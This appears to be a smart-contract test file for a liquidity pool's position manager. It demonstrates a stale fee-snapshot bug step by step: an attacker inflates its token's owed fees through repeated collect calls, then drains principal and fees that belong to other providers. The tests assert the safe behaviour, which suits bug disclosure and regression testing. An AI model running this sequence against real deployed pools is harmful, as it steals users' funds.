import "../../concrete/BaseCodeCollection.sol";
import "../../concrete/Pools/PoolV3Factory.sol";
import "../../concrete/Pools/PositionManagerV3.sol";

/*
 * PositionManagerV3: a fee-growth snapshot of exactly zero read back from the pool is not
 * written over a token's old (non-zero) snapshot, so the token is credited the same
 * "fee growth" again on every collect. The token's ledger then exceeds what it earned, and
 * pool.collect pays it out of the manager's shared pool position, i.e. out of what the pool
 * owes to OTHER tokens in the same (pool, tickLower, tickUpper).
 *
 * The attacker is an ordinary account: it only holds tokens and calls public manager
 * functions (mint, increaseLiquidity, decreaseLiquidity, collect) on its own token ids.
 * The test contract plays the admin (deployment) and "the market" (liquidity and trading).
 *
 * Every test asserts the safe behaviour and fails today.
 */

contract User {
    function do(address a, string f, variadic args) public returns (variadic) {
        variadic result = address(a).call(f, args);
        return result;
    }
}

contract Describe_PMV3StaleSnapshot {

    Mercata m;
    string[] emptyArray;

    PoolV3Factory factory;
    PositionManagerV3 manager;
    address token0Address;
    address token1Address;
    address poolAddress;
    PoolV3 pool;

    User attacker;
    User victim;

    uint constant Q96 = 79228162514264337593543950336;
    uint constant BIG = 100000000e18;
    uint constant MAX_COLLECT = 340282366920938463463374607431768211456; // 2^128

    function beforeAll() {
        m = new Mercata();
        emptyArray = new string[](0);
    }

    function beforeEach() {
        AdminRegistry reg = m.adminRegistry();
        (bool executed, variadic ret) = reg.castVoteOnIssue(address(m.tokenFactory()), "createToken",
            "Token 0", "Test Token 0", emptyArray, emptyArray, emptyArray, "TK0", 10000000e18, 18
        );
        token0Address = address(ret);
        (executed, ret) = reg.castVoteOnIssue(address(m.tokenFactory()), "createToken",
            "Token 1", "Test Token 1", emptyArray, emptyArray, emptyArray, "TK1", 10000000e18, 18
        );
        token1Address = address(ret);
        reg.castVoteOnIssue(token0Address, "setStatus", 2); // ACTIVE
        reg.castVoteOnIssue(token1Address, "setStatus", 2); // ACTIVE
        reg.castVoteOnIssue(token0Address, "mint", address(this), BIG);
        reg.castVoteOnIssue(token1Address, "mint", address(this), BIG);

        factory = new PoolV3Factory(address(this));
        factory.initialize(address(m.tokenFactory()), address(m.feeCollector()));
        poolAddress = factory.createPoolV3(token0Address, token1Address, 3000, Q96);
        pool = PoolV3(poolAddress);

        manager = new PositionManagerV3(address(this));
        manager.initialize(address(factory));

        require(ERC20(token0Address).approve(address(manager), BIG), "approve0");
        require(ERC20(token1Address).approve(address(manager), BIG), "approve1");

        // Ordinary users: tokens and manager approvals only. No admin rights.
        attacker = _newUser(10000e18);
        victim = _newUser(10000e18);

        // Market liquidity around the price (the test contract acts as "everyone else").
        manager.mint(poolAddress, -6000, 6000, 100000e18, 100000e18, 0, 0, address(this), _deadline());
    }

    function _deadline() internal returns (uint) {
        return block.timestamp + 3600;
    }

    function _newUser(uint amount) internal returns (User) {
        User u = new User();
        m.adminRegistry().castVoteOnIssue(token0Address, "mint", address(u), amount);
        m.adminRegistry().castVoteOnIssue(token1Address, "mint", address(u), amount);
        u.do(token0Address, "approve", address(manager), BIG);
        u.do(token1Address, "approve", address(manager), BIG);
        return u;
    }

    function _swap(bool zeroForOne, uint amountIn) internal {
        address tokenIn = zeroForOne ? token0Address : token1Address;
        require(ERC20(tokenIn).approve(poolAddress, amountIn), "swap approve");
        pool.swap(address(this), zeroForOne, int(amountIn), 0, 1, _deadline());
    }

    function _owed(uint tokenId) internal returns (uint, uint) {
        (, , , , uint o0, uint o1) = manager.getPosition(tokenId);
        return (o0 + 0, o1 + 0);
    }

    function _liq(uint tokenId) internal returns (uint) {
        (, , , uint l, , ) = manager.getPosition(tokenId);
        return l + 0;
    }

    function _bal1(address a) internal returns (uint) {
        return ERC20(token1Address).balanceOf(a);
    }

    /// The attacker's preparation, with its own funds and public functions only.
    /// Range [-1200, -600) lies below the price (tick 0): it holds token1 only and earns no fees.
    /// Returns the attacker's token id on that range.
    function _prepareTrap(uint trapAmount1) internal returns (uint) {
        // 1. A helper position initialises tick -600 while fee growth is still low.
        uint helperId = manager.nextTokenId() + 0;
        attacker.do(address(manager), "mint",
            poolAddress, -600, -540, 0, 1e18, 0, 0, address(attacker), _deadline());

        // 2. Ordinary trading by others; global fee growth rises. Price ends near tick 0.
        _swap(true, 20000e18);
        _swap(false, 20000e18);
        require(pool.currentTick() > -540, "setup: price must stay above the helper range");

        // 3. The attacker's token on [-1200, -600): tick -1200 is initialised now, at the
        //    higher fee growth, so fee growth inside the range is negative, and so is the
        //    token's snapshot.
        uint trapId = manager.nextTokenId() + 0;
        attacker.do(address(manager), "mint",
            poolAddress, -1200, -600, 0, 1e18, 0, 0, address(attacker), _deadline());

        // 4. Empty both positions: ticks -1200, -600 and -540 are cleared.
        attacker.do(address(manager), "decreaseLiquidity", trapId, _liq(trapId), 0, 0, _deadline());
        attacker.do(address(manager), "collect", trapId, address(attacker), MAX_COLLECT, MAX_COLLECT);
        attacker.do(address(manager), "decreaseLiquidity", helperId, _liq(helperId), 0, 0, _deadline());
        attacker.do(address(manager), "collect", helperId, address(attacker), MAX_COLLECT, MAX_COLLECT);

        // 5. Add liquidity to the same token again. The ticks are fresh, fee growth inside is
        //    exactly 0, and the token's old negative snapshot should be replaced by 0.
        attacker.do(address(manager), "increaseLiquidity", trapId, 0, trapAmount1, 0, 0, _deadline());
        return trapId;
    }

    // The range is below the price the whole time: it earns nothing, so collect must credit nothing.
    function it_collect_credits_nothing_when_no_fees_were_earned() {
        uint trapId = _prepareTrap(5000e18);

        attacker.do(address(manager), "collect", trapId, address(attacker), 0, 0);
        (uint owed0, uint owed1) = _owed(trapId);
        require(owed0 == 0 && owed1 == 0,
            "token was credited fees it never earned: owed0=" + string(owed0) + " owed1=" + string(owed1));
    }

    // Same, called three times: a phantom credit must not repeat.
    function it_repeated_collect_does_not_keep_crediting() {
        uint trapId = _prepareTrap(5000e18);

        attacker.do(address(manager), "collect", trapId, address(attacker), 0, 0);
        (uint a0, uint a1) = _owed(trapId);
        attacker.do(address(manager), "collect", trapId, address(attacker), 0, 0);
        attacker.do(address(manager), "collect", trapId, address(attacker), 0, 0);
        (uint b0, uint b1) = _owed(trapId);
        require(b0 == a0 && b1 == a1,
            "owed amounts grew with no trading: owed1 " + string(a1) + " -> " + string(b1));
    }

    // A victim provides liquidity in the same range and withdraws it (decreaseLiquidity, then
    // collect, the two transactions the app sends). Its principal must reach it.
    function it_victim_principal_cannot_be_collected_by_another_token() {
        uint trapId = _prepareTrap(5000e18);
        uint attackerStart = _bal1(address(attacker));

        // the attacker inflates its token's ledger; costs nothing but transaction fees
        for (uint i = 0; i < 40; i++) {
            attacker.do(address(manager), "collect", trapId, address(attacker), 0, 0);
        }

        // victim: mint in the same range, later decrease
        uint victimId = manager.nextTokenId() + 0;
        victim.do(address(manager), "mint",
            poolAddress, -1200, -600, 0, 1000e18, 0, 0, address(victim), _deadline());
        victim.do(address(manager), "decreaseLiquidity", victimId, _liq(victimId), 0, 0, _deadline());
        (, uint victimOwed1) = _owed(victimId);
        require(victimOwed1 > 999e18, "setup: victim should be owed its principal");

        // the attacker's collect lands before the victim's
        attacker.do(address(manager), "collect", trapId, address(attacker), MAX_COLLECT, MAX_COLLECT);
        uint attackerGot = _bal1(address(attacker)) - attackerStart;

        uint victimBefore = _bal1(address(victim));
        victim.do(address(manager), "collect", victimId, address(victim), MAX_COLLECT, MAX_COLLECT);
        uint victimGot = _bal1(address(victim)) - victimBefore;

        require(victimGot == victimOwed1,
            "victim received " + string(victimGot) + " of " + string(victimOwed1)
            + " owed; the attacker's collect took " + string(attackerGot));
    }

    // No ordering needed for fees: a victim's earned fees sit in the shared pool position until
    // the victim collects, and the attacker's token can take them at any time.
    function it_victim_fees_cannot_be_collected_by_another_token() {
        uint trapId = _prepareTrap(5000e18);
        for (uint i = 0; i < 40; i++) {
            attacker.do(address(manager), "collect", trapId, address(attacker), 0, 0);
        }
        // the attacker takes its own capital back (requesting exactly what the pool holds for
        // the range, so the inflated ledger is kept); only dust stays to keep the token "live"
        attacker.do(address(manager), "decreaseLiquidity", trapId, _liq(trapId) - 1000, 0, 0, _deadline());
        (, , uint sharedOwed1) = pool.getPosition(address(manager), -1200, -600);
        attacker.do(address(manager), "collect", trapId, address(attacker), 0, sharedOwed1 + 0);
        uint attackerStart = _bal1(address(attacker));

        // victim provides liquidity in the same range
        uint victimId = manager.nextTokenId() + 0;
        victim.do(address(manager), "mint",
            poolAddress, -1200, -600, 0, 1000e18, 0, 0, address(victim), _deadline());

        // the price moves into the range and trading there earns the victim fees in token1
        _swap(true, 19000e18);
        require(pool.currentTick() < -600 && pool.currentTick() >= -1200,
            "setup: price should be inside the range, tick=" + string(pool.currentTick()));
        _swap(false, 300e18);
        _swap(true, 300e18);
        _swap(false, 300e18);

        // what the victim's token has earned (accrue without paying out)
        victim.do(address(manager), "collect", victimId, address(victim), 0, 0);
        (, uint victimOwed1) = _owed(victimId);
        require(victimOwed1 > 0, "setup: victim should have earned token1 fees");

        // the attacker collects first
        attacker.do(address(manager), "collect", trapId, address(attacker), 0, MAX_COLLECT);
        uint attackerGot = _bal1(address(attacker)) - attackerStart;

        uint victimBefore = _bal1(address(victim));
        victim.do(address(manager), "collect", victimId, address(victim), 0, MAX_COLLECT);
        uint victimGot = _bal1(address(victim)) - victimBefore;

        require(victimGot == victimOwed1,
            "victim received " + string(victimGot) + " of " + string(victimOwed1)
            + " fees owed; the attacker's token took " + string(attackerGot));
    }
}
